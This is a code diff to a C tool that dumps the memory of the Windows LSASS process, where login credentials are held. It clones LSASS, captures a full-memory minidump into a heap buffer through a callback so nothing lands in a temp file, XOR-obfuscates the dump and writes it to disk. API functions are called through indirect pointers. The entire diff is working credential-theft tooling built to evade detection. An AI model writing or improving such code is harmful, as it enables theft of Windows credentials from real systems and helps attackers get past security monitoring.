@@ -70,8 +70,59 @@ DWORD GetProcessIdFromHandle(HANDLE hProcess) {
 }
 
 // ==================================
-// Dumping LSASS
+// Dumping LSASS in memory
 // ==================================
+
+// Xoring LSASS
+LPVOID dumpBuffer = NULL;
+DWORD dumpSize = 0;
+
+BOOL InitializeDumpBuffer() {
+    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Dynamic allocation (200MB)
+    if (dumpBuffer == NULL) {
+        log_error("Failed to allocate memory for dump buffer");
+        return FALSE;
+    }
+    return TRUE;
+}
+
+// Callback routine that we be called by the MiniDumpWriteDump function
+BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
+    LPVOID destination = 0;
+    LPVOID source = 0;
+    DWORD bufferSize = 0;
+    switch (CallbackInput->CallbackType) {
+    case IoStartCallback:
+        CallbackOutput->Status = S_FALSE;
+        log_info("Starting dump to memory buffer");
+        break;
+    case IoWriteAllCallback:
+        // Buffer holding the current chunk of dump data
+        source = CallbackInput->Io.Buffer;
+
+        // Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
+        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
+
+        // Size of the current chunk of dump data
+        bufferSize = CallbackInput->Io.BufferBytes;
+
+        // Copy the chunk data to the appropriate memory address of our allocated buffer
+        RtlCopyMemory(destination, source, bufferSize);
+        dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size
+
+        //printf("[+] Copied %i bytes to memory buffer\n", bufferSize);
+
+        CallbackOutput->Status = S_OK;
+        break;
+    case IoFinishCallback:
+        CallbackOutput->Status = S_OK;
+        log_success("Copied %i bytes to memory buffer", dumpSize);
+        break;
+    }
+    return TRUE;
+}
+
+
 
 BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
     HANDLE hClone = CloneLsassProcess();
@@ -82,65 +133,60 @@ BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
 
     DWORD clonedPID = GetProcessId(hClone);
 
-    HANDLE hTempFile = pCFA(
-        "C:\\Users\\Public\\__tmpdump.dmp",
-        GENERIC_READ | GENERIC_WRITE,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
-        NULL
-    );
+    if (!InitializeDumpBuffer()) {
+        return FALSE; 
+    }
 
-    if (hTempFile == INVALID_HANDLE_VALUE) {
-        log_error("Failed to create temp file. Error: %lu", GetLastError());
-        return FALSE;
-    }    
+    // Callback configuration
+    MINIDUMP_CALLBACK_INFORMATION mci;
+    mci.CallbackRoutine = DumpCallbackRoutine;
+    mci.CallbackParam = (PVOID)key; // key passed as parameter
 
+    // Dump
     BOOL dumped = pMDWD(
         hClone,
         clonedPID,
-        hTempFile,
+        NULL,
         MiniDumpWithFullMemory,
         NULL,
         NULL,
-        NULL
+        &mci
     );
 
     if (!dumped) {
-        log_error("Dump failed. Error: %lu", GetLastError());
-        CloseHandle(hTempFile);
+        log_error("Dump failed. Error: %lu", GetLastError());        
+        HeapFree(GetProcessHeap(), 0, dumpBuffer);
         return FALSE;
     }
 
-    // Move file pointer to beginning
-    SetFilePointer(hTempFile, 0, NULL, FILE_BEGIN);
+    // Xoring the buffer
+    xor_buffer(dumpBuffer, dumpSize, key, key_len);
 
-    // Get file size
-    DWORD fileSize = GetFileSize(hTempFile, NULL);
-    BYTE* buffer = (BYTE*)malloc(fileSize);
-    DWORD bytesRead;
-    ReadFile(hTempFile, buffer, fileSize, &bytesRead, NULL);
-
-    if (bytesRead != fileSize) {
-        log_error("ReadFile read %lu bytes, expected %lu", bytesRead, fileSize);
-        free(buffer);
-        CloseHandle(hTempFile);
-        return FALSE;
-    }
-
-    // XOR encrypt in memory
-    char* encrypted = xor_encrypt_buffer(buffer, fileSize, key, key_len);
-    free(buffer);
-    CloseHandle(hTempFile);
-
+    // Create file on disk
     HANDLE dumpFile = pCFA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    DWORD bytesWritten;
-    WriteFile(dumpFile, encrypted, fileSize, &bytesWritten, NULL);
-    CloseHandle(dumpFile);
-    free(encrypted);
+    if (dumpFile == INVALID_HANDLE_VALUE) {
+        log_error("Failed to create output file. Error: %lu", GetLastError());
+        HeapFree(GetProcessHeap(), 0, dumpBuffer);
+        return FALSE;
+    }
 
-    log_info("XOR'd dump written to %s", outPath);
+    // Write buffer on file
+    DWORD bytesWritten = 0;
+    BOOL writeSuccess = WriteFile(dumpFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
+    CloseHandle(dumpFile);
+
+    if (!writeSuccess || bytesWritten != dumpSize) {
+        log_error("Failed to write XORed dump to file. Error: %lu", GetLastError());
+        HeapFree(GetProcessHeap(), 0, dumpBuffer);
+        return FALSE;
+    }
+
+    log_success("XOR'd dump written to %s successfully", outPath);
+    
+    HeapFree(GetProcessHeap(), 0, dumpBuffer);
+    dumpBuffer = NULL;
+    dumpSize = 0;
+
     return TRUE;
 }
 
